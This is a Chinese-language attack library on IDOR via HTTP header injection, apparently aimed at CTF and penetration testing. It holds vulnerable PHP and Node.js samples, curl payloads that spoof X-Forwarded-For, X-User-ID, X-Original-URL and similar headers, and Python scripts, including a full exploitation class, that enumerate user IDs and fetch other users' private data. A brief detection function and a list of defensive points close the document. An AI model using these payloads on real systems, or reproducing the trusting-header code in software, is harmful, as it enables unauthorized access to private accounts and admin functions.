# IDOR-HTTP头部注入 攻击库

## 漏洞概述

IDOR(Insecure Direct Object Reference)通过HTTP头部注入是一种特殊的IDOR变种攻击,攻击者通过伪造或操纵HTTP请求头部(如X-Forwarded-For、X-Real-IP、X-User-ID等)来绕过访问控制,访问未授权的资源或执行特权操作。

**攻击特点**:
- 利用应用程序对HTTP头部的信任
- 绕过基于IP或用户标识的访问控制
- 常见于云服务和代理环境
- 可导致水平和垂直权限提升

**常见漏洞头部**:
- X-Forwarded-For (IP伪造)
- X-Real-IP (真实IP伪造)
- X-User-ID / X-UID (用户标识伪造)
- X-Original-URL (URL重写绕过)
- Authorization (令牌伪造)
- Referer (来源伪造)

## 核心攻击技术

### 1. X-Forwarded-For 头部伪造

**原理**: 应用程序信任X-Forwarded-For头部作为用户真实IP来源,未验证其真实性

**场景**: 基于IP白名单的访问控制

**典型漏洞代码 (PHP)**:
```php
<?php
// 危险实现 - 直接信任X-Forwarded-For
$allowed_ips = ['127.0.0.1', 'localhost', '192.168.1.100'];

if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && 
    in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $allowed_ips)) {
    // 授予管理员权限
    echo "Welcome Admin: " . $flag;
} else {
    echo "Access Denied";
}
?>
```

**攻击载荷**:

```bash
# 基础伪造
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin

# localhost变种
curl -H "X-Forwarded-For: localhost" http://target.com/admin

# 内网IP伪造
curl -H "X-Forwarded-For: 192.168.1.100" http://target.com/admin

# 多IP链伪造
curl -H "X-Forwarded-For: 127.0.0.1, 8.8.8.8" http://target.com/admin
```

**Python自动化脚本**:

```python
#!/usr/bin/env python3
import requests

def test_xff_bypass(target_url):
    """测试X-Forwarded-For绕过"""
    
    # 常见的内网和本地IP
    test_ips = [
        '127.0.0.1',
        'localhost',
        '::1',
        '0.0.0.0',
        '192.168.1.1',
        '10.0.0.1',
        '172.16.0.1',
        '0',
        '127.1',
        '2130706433',  # 127.0.0.1的十进制表示
    ]
    
    for ip in test_ips:
        headers = {'X-Forwarded-For': ip}
        
        try:
            response = requests.get(target_url, headers=headers, timeout=5)
            
            # 检测成功标志
            if any(keyword in response.text.lower() for keyword in 
                   ['admin', 'flag', 'success', 'congratulations']):
                print(f"[+] 成功! IP: {ip}")
                print(f"[+] 响应: {response.text[:200]}")
                return True
                
        except Exception as e:
            print(f"[-] IP {ip} 测试失败: {e}")
    
    return False

# 使用示例
test_xff_bypass("http://target.com/admin")
```

### 2. X-Real-IP 头部伪造

**原理**: 类似X-Forwarded-For,但更容易被信任

**场景**: Nginx反向代理配置不当

**攻击载荷**:

```bash
# 单独使用X-Real-IP
curl -H "X-Real-IP: 127.0.0.1" http://target.com/api/users

# 同时使用多个头部增加成功率
curl -H "X-Real-IP: 127.0.0.1" \
     -H "X-Forwarded-For: 127.0.0.1" \
     -H "Client-IP: 127.0.0.1" \
     http://target.com/api/users
```

**Python脚本**:

```python
def test_real_ip_bypass(target_url):
    """测试X-Real-IP绕过"""
    headers = {
        'X-Real-IP': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'Client-IP': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Client-IP': '127.0.0.1'
    }
    
    response = requests.get(target_url, headers=headers)
    
    if 'admin' in response.text.lower():
        print("[+] X-Real-IP绕过成功!")
        return True
    return False
```

### 3. X-User-ID 头部注入

**原理**: 应用程序从自定义头部获取用户ID,未验证真实性

**场景**: 微服务架构中的服务间认证

**典型漏洞代码 (Node.js)**:
```javascript
// 危险实现
app.get('/api/profile', (req, res) => {
    const userId = req.headers['x-user-id'];  // 直接信任头部
    
    db.query('SELECT * FROM users WHERE id = ?', [userId], (err, result) => {
        res.json(result[0]);
    });
});
```

**攻击载荷**:

```bash
# 枚举用户ID
for i in {1..100}; do
    curl -H "X-User-ID: $i" http://target.com/api/profile
done

# 尝试管理员ID
curl -H "X-User-ID: 1" http://target.com/api/admin/settings
curl -H "X-User-ID: 0" http://target.com/api/admin/settings
curl -H "X-User-ID: admin" http://target.com/api/admin/settings
```

**Python完整利用脚本**:

```python
#!/usr/bin/env python3
import requests
import json

def exploit_user_id_header(base_url, target_user_id=1):
    """
    利用X-User-ID头部注入访问其他用户数据
    
    参数:
        base_url: 目标URL
        target_user_id: 目标用户ID
    """
    
    endpoints = [
        '/api/profile',
        '/api/orders',
        '/api/settings',
        '/api/admin',
        '/user/data',
        '/dashboard'
    ]
    
    for endpoint in endpoints:
        url = base_url + endpoint
        headers = {
            'X-User-ID': str(target_user_id),
            'X-UID': str(target_user_id),
            'User-ID': str(target_user_id)
        }
        
        try:
            response = requests.get(url, headers=headers, timeout=5)
            
            if response.status_code == 200:
                print(f"[+] 成功访问: {url}")
                print(f"[+] User ID: {target_user_id}")
                
                # 尝试解析JSON响应
                try:
                    data = response.json()
                    print(f"[+] 数据: {json.dumps(data, indent=2)}")
                except:
                    print(f"[+] 响应: {response.text[:200]}")
                    
        except Exception as e:
            print(f"[-] {endpoint} 失败: {e}")

# 枚举多个用户
for uid in range(1, 20):
    print(f"\n=== 测试 User ID: {uid} ===")
    exploit_user_id_header("http://target.com", uid)
```

### 4. X-Original-URL 头部重写绕过

**原理**: 某些中间件(如IIS)支持URL重写头部,可绕过路径访问控制

**场景**: 基于路径的访问控制

**攻击载荷**:

```bash
# 访问被阻止的/admin路径
curl http://target.com/ -H "X-Original-URL: /admin"

# 绕过WAF规则
curl http://target.com/public -H "X-Original-URL: /admin/delete?id=1"

# 组合使用
curl http://target.com/allowed \
     -H "X-Original-URL: /admin/users" \
     -H "X-Rewrite-URL: /admin/users"
```

**Python脚本**:

```python
def test_url_rewrite_bypass(base_url, protected_path):
    """测试URL重写头部绕过"""
    
    rewrite_headers = [
        'X-Original-URL',
        'X-Rewrite-URL',
        'X-Original-Path',
        'X-Override-URL'
    ]
    
    for header in rewrite_headers:
        headers = {header: protected_path}
        
        # 访问一个允许的路径,但通过头部重写到受保护路径
        response = requests.get(base_url + '/public', headers=headers)
        
        if response.status_code == 200 and 'denied' not in response.text.lower():
            print(f"[+] 成功! 使用头部: {header}")
            print(f"[+] 响应: {response.text[:200]}")
            return True
            
    return False
```

### 5. Authorization 头部伪造

**原理**: 伪造或修改Authorization头部获取未授权访问

**场景**: JWT令牌验证不严格

**攻击载荷**:

```bash
# 移除签名部分
curl -H "Authorization: Bearer eyJhbGc...eyJ1c2Vy..." http://target.com/api/admin

# 空令牌
curl -H "Authorization: Bearer " http://target.com/api/admin

# 修改用户ID
curl -H "Authorization: Bearer MODIFIED_TOKEN" http://target.com/api/admin
```

### 6. Referer 头部伪造

**原理**: 应用程序基于Referer头部进行访问控制

**攻击载荷**:

```bash
# 伪造来自管理页面的请求
curl -H "Referer: http://target.com/admin/dashboard" \
     http://target.com/admin/delete-user?id=5

# 伪造内部来源
curl -H "Referer: http://localhost/admin" \
     http://target.com/api/sensitive
```

## 综合利用脚本

```python
#!/usr/bin/env python3
import requests
import itertools

class HTTPHeaderIDOR:
    """HTTP头部IDOR综合测试工具"""
    
    def __init__(self, target_url):
        self.target_url = target_url
        self.successful_payloads = []
    
    def test_ip_spoofing(self):
        """测试IP伪造头部"""
        ip_headers = {
            'X-Forwarded-For': ['127.0.0.1', 'localhost', '::1'],
            'X-Real-IP': ['127.0.0.1', '192.168.1.1'],
            'Client-IP': ['127.0.0.1'],
            'X-Originating-IP': ['127.0.0.1'],
            'X-Remote-IP': ['127.0.0.1'],
            'X-Client-IP': ['127.0.0.1']
        }
        
        for header_name, ip_list in ip_headers.items():
            for ip in ip_list:
                headers = {header_name: ip}
                self._send_request(headers, f"IP伪造 - {header_name}: {ip}")
    
    def test_user_id_injection(self, user_ids):
        """测试用户ID注入"""
        user_id_headers = ['X-User-ID', 'X-UID', 'User-ID', 'X-Account-ID']
        
        for header_name in user_id_headers:
            for uid in user_ids:
                headers = {header_name: str(uid)}
                self._send_request(headers, f"用户ID注入 - {header_name}: {uid}")
    
    def test_url_rewrite(self, protected_paths):
        """测试URL重写"""
        rewrite_headers = ['X-Original-URL', 'X-Rewrite-URL', 'X-Override-URL']
        
        for header_name in rewrite_headers:
            for path in protected_paths:
                headers = {header_name: path}
                self._send_request(headers, f"URL重写 - {header_name}: {path}")
    
    def test_combined_headers(self):
        """测试组合头部"""
        combined_headers = {
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-User-ID': '1',
            'X-Original-URL': '/admin'
        }
        self._send_request(combined_headers, "组合头部攻击")
    
    def _send_request(self, headers, description):
        """发送请求并检测响应"""
        try:
            response = requests.get(self.target_url, headers=headers, timeout=5)
            
            # 成功标志检测
            success_indicators = ['admin', 'flag', 'success', 'congratulations', 
                                 'authorized', 'granted']
            
            if response.status_code == 200:
                content_lower = response.text.lower()
                if any(indicator in content_lower for indicator in success_indicators):
                    print(f"\n[+] 成功! {description}")
                    print(f"[+] 响应状态: {response.status_code}")
                    print(f"[+] 响应片段: {response.text[:300]}")
                    self.successful_payloads.append({
                        'headers': headers,
                        'description': description,
                        'response': response.text[:500]
                    })
        
        except Exception as e:
            pass
    
    def run_all_tests(self):
        """运行所有测试"""
        print("[*] 开始HTTP头部IDOR测试...")
        
        # 测试IP伪造
        print("\n[*] 测试IP伪造...")
        self.test_ip_spoofing()
        
        # 测试用户ID注入
        print("\n[*] 测试用户ID注入...")
        self.test_user_id_injection(range(0, 20))
        
        # 测试URL重写
        print("\n[*] 测试URL重写...")
        protected_paths = ['/admin', '/api/admin', '/admin/users', '/dashboard']
        self.test_url_rewrite(protected_paths)
        
        # 测试组合头部
        print("\n[*] 测试组合头部...")
        self.test_combined_headers()
        
        # 输出结果
        print(f"\n\n{'='*60}")
        print(f"测试完成! 发现 {len(self.successful_payloads)} 个成功载荷")
        print(f"{'='*60}")
        
        for payload in self.successful_payloads:
            print(f"\n描述: {payload['description']}")
            print(f"头部: {payload['headers']}")

# 使用示例
if __name__ == "__main__":
    tester = HTTPHeaderIDOR("http://target.com/admin")
    tester.run_all_tests()
```

## 防御检测

### 检测方法

```python
def detect_header_injection():
    """检测HTTP头部注入尝试"""
    
    suspicious_patterns = [
        # IP伪造检测
        lambda req: req.headers.get('X-Forwarded-For') in ['127.0.0.1', 'localhost'],
        
        # 用户ID不匹配检测
        lambda req: req.headers.get('X-User-ID') != req.session.get('user_id'),
        
        # URL重写检测
        lambda req: req.headers.get('X-Original-URL') is not None,
    ]
    
    for pattern in suspicious_patterns:
        if pattern(request):
            log_security_event("可能的头部注入攻击")
            return True
    
    return False
```

## 实战案例场景

### 场景1: 基于IP的管理员访问

**描述**: Web应用仅允许内网IP访问管理面板

**利用**:
```bash
curl -H "X-Forwarded-For: 127.0.0.1" \
     -d "username=admin&password=test" \
     http://target.com/admin/login
```

### 场景2: 微服务用户ID传递

**描述**: 微服务间通过X-User-ID头部传递用户身份

**利用**:
```python
# 访问其他用户的订单
headers = {'X-User-ID': '123'}  # 其他用户的ID
requests.get("http://api.target.com/orders", headers=headers)
```

### 场景3: CDN配置错误

**描述**: CDN信任X-Original-URL进行路由

**利用**:
```bash
curl http://cdn.target.com/public \
     -H "X-Original-URL: /admin/config.json"
```

## 关键检测点

1. **头部来源验证**: 不要盲目信任HTTP头部
2. **多层验证**: 结合Session和头部进行验证
3. **IP验证**: 验证真实源IP而非代理头部
4. **用户身份**: 始终从Session获取用户ID
5. **日志记录**: 记录所有敏感头部值

## 成功标志

- 使用伪造头部成功访问受限资源
- 绕过IP白名单限制
- 访问其他用户的私有数据
- 执行管理员操作
- 获取敏感信息或flag
